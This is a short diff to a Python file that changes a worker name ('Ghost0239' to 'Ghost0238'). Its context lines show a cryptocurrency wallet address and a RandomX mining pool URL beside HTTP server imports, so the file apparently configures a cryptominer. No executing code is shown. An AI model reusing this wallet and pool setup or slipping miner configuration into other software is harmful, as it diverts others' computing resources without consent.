@@ -6,7 +6,7 @@ import http.server
 import socketserver
 
 
-WORKER_NAME = "Ghost0239" 
+WORKER_NAME = "Ghost0238" 
 WALLET_ADDR = "DP2DhHWz1gD2EhvZ6zbMcZe9P8z7Bytxcc"
 POOL_URL = "rx.unmineable.com:3333" 
 
